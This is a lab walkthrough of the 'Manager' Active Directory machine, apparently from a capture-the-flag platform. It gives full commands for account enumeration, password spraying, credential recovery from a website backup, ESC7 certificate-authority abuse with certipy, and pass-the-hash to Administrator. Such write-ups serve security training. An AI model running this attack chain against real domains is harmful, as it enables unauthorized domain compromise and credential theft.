# Manager

Manager is a Windows Active Directory machine that demonstrates how exposed backup files, weak credentials, and misconfigured Active Directory Certificate Services (AD CS) can combine into a complete domain compromise.

The initial foothold comes from credentials recovered from a website backup. From there, the path to Administrator involves abusing the CA's `ManageCa` permission through **ESC7**.

## 1. Enumeration

Start with a full TCP port scan and service detection.

```
nmap -p- --min-rate 1000 -oN ports.txt TARGET_IP
nmap -sC -sV -p <OPEN_PORTS> -oN services.txt TARGET_IP
```

The scan identifies several Windows and Active Directory services, including:

- DNS (53)
    
- HTTP (80)
    
- Kerberos (88)
    
- LDAP (389, 636)
    
- SMB (445)
    
- Microsoft SQL Server (1433)
    
- WinRM (5985)
    
- Active Directory Global Catalog (3268, 3269)
    

The web service runs Microsoft IIS, while the other exposed services suggest that the target is an Active Directory domain controller.

Add the domain and hostname to `/etc/hosts`.

```
echo "TARGET_IP manager.htb dc01.manager.htb" | sudo tee -a /etc/hosts
```

## 2. SMB Enumeration and RID Cycling

Anonymous SMB access reveals the available shares, but attempting to browse `NETLOGON` and `SYSVOL` does not provide access.

```
smbclient -N -L //TARGET_IP/
```

Use Impacket's `lookupsid.py` to enumerate domain accounts through SID lookups.

```
impacket-lookupsid 'anonymous@manager.htb' -dc-ip TARGET_IP
```

Among the discovered users are `Zhong`, `Cheng`, `Ryan`, `Raven`, `JinWoo`, `ChinHae`, and `Operator`.

Save the usernames to a file and check whether any accounts are vulnerable to AS-REP roasting.

```
impacket-GetNPUsers manager.htb/ \
  -dc-ip TARGET_IP \
  -usersfile users.list \
  -request
```

The discovered accounts do not yield a usable AS-REP roast in this attempt, so continue with other authentication avenues.

## 3. Discovering Weak Credentials

Test the discovered usernames against SMB using simple username-matching passwords.

```
nxc smb TARGET_IP -u users.list -p users.list
```

The successful credential pair is:

```
Username: operator
Password: operator
```

These credentials provide authenticated access to SMB and are also accepted by the MSSQL service.

## 4. MSSQL Enumeration

Connect to SQL Server using Windows authentication.

```
impacket-mssqlclient operator@TARGET_IP -windows-auth
```

Once connected, use `xp_dirtree` to enumerate accessible directories on the server.

```
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\
```

The web root is particularly interesting:

```
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
```

Among the website files is a backup archive:

```
website-backup-27-07-23-old.zip
```

This is a useful lead: backup files often retain configuration values that should never have been exposed through a web server.

## 5. Recovering Credentials from the Website Backup

Download the archive from the web server.

```
wget http://manager.htb/website-backup-27-07-23-old.zip -O web.zip
unzip web.zip -d website-backup
```

Inspect the extracted configuration files, especially `.old-conf.xml`.

The configuration contains LDAP connection details and credentials belonging to the domain user `raven`.

```
<user>raven@manager.htb</user>
<password><REDACTED></password>
```

The credentials recovered from the backup work for Raven's WinRM access.

```
evil-winrm -i TARGET_IP -u raven -p '<REDACTED>'
```

This provides a remote PowerShell session as Raven.

### User flag

The user flag is obtained from Raven's session. Its value is intentionally redacted in this public writeup.

```
type C:\Users\Raven\Desktop\user.txt
```

## 6. Enumerating Active Directory Certificate Services

With authenticated access as Raven, enumerate the domain's certificate authority and certificate templates.

```
certipy-ad find \
  -u 'raven@manager.htb' \
  -p '<REDACTED>' \
  -dc-ip TARGET_IP \
  -dc-host dc01.manager.htb \
  -target-ip TARGET_IP \
  -stdout -enabled -vulnerable
```

The output identifies the certificate authority:

```
CA Name: manager-DC01-CA
```

More importantly, Raven has the `**ManageCa**` permission on the CA.

This permission allows Raven to manage the certificate authority, including issuing pending certificate requests. Combined with the ability to enable the `SubCA` template, this creates an ESC7 privilege-escalation path.

## 7. Exploiting ESC7

ESC7 involves excessive certificate authority management permissions. In this scenario, Raven can add themselves as a CA officer, enable the `SubCA` template, and manually issue a certificate request that the CA initially denies.

### 7.1 Add Raven as a CA officer

```
certipy-ad ca \
  -ca 'manager-DC01-CA' \
  -add-officer raven \
  -u 'raven@manager.htb' \
  -p '<REDACTED>' \
  -dc-ip TARGET_IP \
  -dc-host dc01.manager.htb \
  -target-ip TARGET_IP
```

### 7.2 Enable the SubCA template

```
certipy-ad ca \
  -ca 'manager-DC01-CA' \
  -enable-template SubCA \
  -u 'raven@manager.htb' \
  -p '<REDACTED>' \
  -dc-ip TARGET_IP \
  -dc-host dc01.manager.htb \
  -target-ip TARGET_IP
```

### 7.3 Request a certificate for Administrator

Request a certificate using the `SubCA` template while specifying the Administrator UPN.

```
certipy-ad req \
  -u 'raven@manager.htb' \
  -p '<REDACTED>' \
  -ca 'manager-DC01-CA' \
  -template SubCA \
  -upn 'administrator@manager.htb' \
  -dc-ip TARGET_IP
```

The request is created, but the CA initially returns:

```
CERTSRV_E_TEMPLATE_DENIED
```

The denial does not end the attack. The request has been submitted and has a request ID, allowing the CA officer to issue it manually.

Record the request ID from your own output; in this run, it was `21`.

### 7.4 Issue the denied request

```
certipy-ad ca \
  -u 'raven@manager.htb' \
  -p '<REDACTED>' \
  -ca 'manager-DC01-CA' \
  -issue-request 21 \
  -dc-ip TARGET_IP
```

The CA successfully issues the pending request.

### 7.5 Retrieve the certificate

```
certipy-ad req \
  -u 'raven@manager.htb' \
  -p '<REDACTED>' \
  -ca 'manager-DC01-CA' \
  -template SubCA \
  -retrieve 21 \
  -dc-ip TARGET_IP
```

Certipy saves the resulting certificate as `administrator.pfx`.

## 8. Authenticate as Administrator

Use the issued certificate to authenticate and retrieve the Administrator account's NTLM hash.

```
certipy-ad auth \
  -pfx administrator.pfx \
  -dc-ip TARGET_IP
```

The output provides an NTLM hash for Administrator. The actual hash is intentionally omitted.

Authenticate to WinRM using the recovered hash:

```
evil-winrm -i TARGET_IP \
  -u administrator \
  -H '<REDACTED_NTLM_HASH>'
```

This provides an Administrator shell on the target.

### Root flag

The root flag is obtained from the Administrator session. Its value is intentionally redacted.

```
type C:\Users\Administrator\Desktop\root.txt
```

## Attack Chain Summary

1. Enumerate exposed Windows and Active Directory services.
    
2. Use RID cycling to discover domain accounts.
    
3. Find weak credentials for `operator`.
    
4. Authenticate to MSSQL and enumerate the IIS web root.
    
5. Download the website backup and recover Raven's credentials.
    
6. Access the host through WinRM as Raven.
    
7. Identify the CA's excessive `ManageCa` permission.
    
8. Abuse ESC7 by enabling `SubCA` and manually issuing an Administrator certificate request.
    
9. Authenticate with the certificate, recover the Administrator NTLM hash, and obtain a privileged WinRM session.
